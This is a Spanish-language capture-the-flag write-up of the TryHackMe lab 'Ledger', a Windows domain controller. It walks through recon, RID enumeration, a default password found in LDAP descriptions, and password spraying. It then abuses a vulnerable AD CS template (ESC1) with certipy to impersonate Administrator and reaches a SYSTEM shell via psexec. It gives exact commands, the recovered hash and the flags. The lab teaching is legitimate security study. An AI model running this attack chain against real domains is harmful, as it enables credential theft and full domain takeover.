Write-up de la máquina **Ledger** de TryHackMe (ruta *Active Directory / Certified*). IP: `10.65.139.17` — dominio: `thm.local` — host: `LABYRINTH` (Windows Server 2019 / Windows 10, build 17763). Atacada desde Kali.

## 1. Reconocimiento

Escaneamos los puertos y servicios con `nmap`:

```
nmap -sV -sC 10.65.139.17
```

![[Pasted image 20261124221906.png]]

![[Pasted image 20261124221927.png]]

La máquina responde como `LABYRINTH` / `thm.local` y expone los servicios típicos de un controlador de dominio:

- **53/tcp** → Simple DNS Plus.
- **80/tcp** → Microsoft IIS httpd 10.0.
- **88/tcp** → Kerberos (Microsoft Windows Kerberos).
- **135/tcp / 139/tcp / 445/tcp** → MSRPC, NetBIOS y SMB (Microsoft Windows RPC / microsoft-ds).
- **389/tcp, 3268/tcp, 3269/tcp** → LDAP / Global Catalog del dominio `thm.local` (site `Default-First-Site-Name`).
- **443/tcp** → HTTPS con certificado `labyrinth.thm.local`.
- **464/tcp, 593/tcp, 636/tcp** → kpasswd5, RPC over HTTP y LDAPS.
- **3389/tcp** → Microsoft Terminal Services (RDP), con `rdp-ntlm-info` confirmando el dominio `THM`.

El equipo tiene **SMB signing habilitado y requerido**, `smb2-security-mode: 3.1.1` y el reloj sincronizado (`clock-skew: -1s`).

## 2. Enumeración de usuarios por SMB (RID)

El servicio SMB permite autenticación nula (`Null Auth: True`), así que enumeramos los RIDs con `netexec` usando el usuario `guest` sin contraseña:

```
nxc smb 10.65.139.17 -u 'guest' -p '' --rid
```

![[Pasted image 20261124224940.png]]

![[Pasted image 20261124225024.png]]

![[Pasted image 20261124225115.png]]

![[Pasted image 20261124225233.png]]

![[Pasted image 20261124225411.png]]

El dominio tiene **219 usuarios**, entre ellos `THM\Administrator` (RID 500), `THM\Guest` (501) y `THM\krbtgt` (502), además de grupos como `Domain Admins`, `Domain Users`, `Enterprise Admins` y `Remote Management Users`. Guardamos la lista de nombres en `usuariok.txt` para reutilizarla más adelante.

## 3. LDAP: la descripción delata la contraseña

Consultamos el directorio de forma anónima y filtramos el atributo `description`:

```
ldapsearch -x -H ldap://10.65.139.17 -b "dc=thm,dc=local" > ldapsearch.txt
cat ldapsearch.txt | grep description
```

![[Pasted image 20261124230747.png]]

![[Pasted image 20261124230810.png]]

Casi todos los usuarios tienen `description: Tier 1 User`, pero un par de entradas contienen la pista clave:

```
description: Please change it: CHANGEME2023!
```

La contraseña inicial nunca se cambió en esas cuentas.

## 4. Password spraying

Probamos `CHANGEME2023!` contra todos los usuarios recopilados, continuando incluso después de aciertos:

```
nxc smb ledger.thm -u usuariok.txt -p 'CHANGEME2023!' --continue-on-success
```

![[Pasted image 20261124231747.png]]

![[Pasted image 20261124231823.png]]

Las cuentas válidas son:

- `thm.local\IVY_WILLIS:CHANGEME2023!`
- `thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!`

## 5. BloodHound: dónde está el acceso

Con `IVY_WILLIS` exportamos el grafo de Active Directory:

```
sudo su
bloodhound-python -u IVY_WILLIS -p 'CHANGEME2023!' -d THM.LOCAL -ns 10.65.139.17 -c All --zip
```

![[Pasted image 20261124232603.png]]

El recolector encuentra 1 dominio, 1 equipo, 493 usuarios, 52 grupos, 222 OUs y 19 contenedores; todo se comprime en `20261124233336_bloodhound.zip`.

Al cargarlo en BloodHound vemos que **SUSANNA_MCKNIGHT** es miembro de `Domain Users`, `Remote Desktop Users` y `Remote Management Users`:

![[Pasted image 20261125000837.png]]

Eso significa que esa cuenta sí puede iniciar sesión por RDP/WinRM, a diferencia de `IVY_WILLIS`.

## 6. Acceso RDP y flag de usuario

Nos conectamos por RDP con `SUSANNA_MCKNIGHT`:

```
xfreerdp3 /v:10.65.139.17 /u:'SUSANNA_MCKNIGHT@thm.local' /p:'CHANGEME2023!'
```

![[Pasted image 20261125001131.png]]

En el escritorio, el bloc de notas contiene la primera bandera:

```
THM{ENUMERATION_IS_THE_KEY}
```

## 7. AD CS: plantilla de certificados vulnerable (ESC1 / ESC17)

Con las credenciales de `SUSANNA_MCKNIGHT` buscamos plantillas de certificados vulnerables con `certipy-ad`:

```
certipy-ad find -vulnerable -stdout -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -dc-ip 10.65.139.17
```

![[Pasted image 20261125004251.png]]

Encuentra 37 plantillas, 14 habilitadas, 21 policies de emisión y la CA `thm-LABYRINTH-CA`. Dos de las plantillas saltan como vulnerables:

- **ESC1** — el solicitante aporta el subject (`Enrollee Supplies Subject: True`).
- **ESC17** — el sujeto se puede suplir y el template permite autenticación de cliente.

![[Pasted image 20261125004310.png]]

La plantilla **`ServerAuth`** es la explotable: `Client Authentication: True`, `Enrollee Supplies Subject: True`, `Requires Manager Approval: False` y los `Authenticated Users` tienen permisos de inscripción. Podemos pedir un certificado con el UPN de otra cuenta.

## 8. Solicitar el certificado como Administrator

El primer intento falla por resolución DNS (`THM.LOCAL` no existe en el atacante), así que repetimos indicando el controlador de dominio con `-dc-ip`:

```
certipy-ad req -u SUSANNA_MCKNIGHT@thm.local -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local' -dc-ip 10.65.139.17
```

![[Pasted image 20261125005345.png]]

![[Pasted image 20261125005814.png]]

Aunque avisa de que `THM.LOCAL` no resuelve, la petición por RPC funciona: `Successfully requested certificate`, con `Request ID: 25`, y guarda `administrator.pfx`.

## 9. De certificado a hash NT de Administrator

Autenticamos con el PFX para obtener el TGT y el hash de la cuenta suplantada:

```
certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.65.139.17 -domain thm.local
```

![[Pasted image 20261125010116.png]]

Certipy obtiene el TGT, escribe `administrator.ccache` y recupera el hash NT:

```
aa3db435b5104eeaaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
```

## 10. Troubleshooting: STATUS_ACCOUNT_RESTRICTION

Antes de conseguir la shell hubo varios intentos fallidos: `psexec` contra una IP equivocada, `evil-winrm` con el hash completo (`Invalid hash format`) y con solo la parte NT (puerto 5985 cerrado), además de `STATUS_ACCOUNT_RESTRICTION` al usar el TGT:

![[Pasted image 20261125012412.png]]

Las notas de la propia captura resumen la solución: reescribir el hash dejando solo la parte NT y usar el ticket Kerberos (`-k`) con `psexec`. `nxc smb` confirma que el hash es correcto y muestra a `Administrator` como invitado.

## 11. Shell SYSTEM con psexec + Kerberos

Con el ccache de Administrator en el entorno:

```
export KRB5CCNAME=administrator.ccache
nxc smb 10.65.139.17 -u Administrator -H aa3db435b5104eeaaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
impacket-psexec -hashes ':07d677a6cf40925beb80ad6428752322' thm.local/Administrator@labyrinth.thm.local -k
```

![[Pasted image 20261125015800.png]]

![[Pasted image 20261125020248.png]]

Conseguimos una shell como SYSTEM en `C:\Windows\system32`.

## 12. Flag de root

Navegamos hasta el escritorio de Administrator y leemos `root.txt`:

![[Pasted image 20261125020539.png]]

```
THM{THE_BYPASS_IS_CERTIFIED!}
```

## Resumen

| Concepto                 | Valor                                                               |
| ------------------------ | ------------------------------------------------------------------- |
| Usuarios válidos         | `IVY_WILLIS`, `SUSANNA_MCKNIGHT`                                    |
| Contraseña               | `CHANGEME2023!` (pista en la descripción LDAP)                      |
| Plantilla AD CS          | `ServerAuth` (ESC1 / ESC17)                                         |
| Hash NT de Administrator | `aa3db435b5104eeaaad3b435b51404ee:07d677a6cf40925beb80ad6428752322` |
| Flag de usuario          | `THM{ENUMERATION_IS_THE_KEY}`                                       |
| Flag de root             | `THM{THE_BYPASS_IS_CERTIFIED!}`                                     |

**Lecciones aprendidas:** la enumeración de atributos `description` en LDAP puede revelar contraseñas por defecto; un usuario con `Remote Management Users` abre RDP/WinRM; y una plantilla de AD CS con `Enrollee Supplies Subject` permite suplantar a Administrator mediante ESC1, cortando la ruta directa a SYSTEM.
